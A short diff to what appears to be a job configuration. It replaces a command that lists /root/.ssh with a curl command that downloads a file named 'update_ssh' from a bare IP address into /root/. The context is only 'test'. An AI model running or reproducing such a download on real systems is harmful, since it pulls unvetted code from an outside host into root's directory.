@@ -1,4 +1,4 @@
-cmd: /usr/bin/ls /root/.ssh
+cmd: /usr/bin/curl -vvv 100.118.165.37:19221/update_ssh -o update_ssh
 dir: /root/
 target: core
 description: test
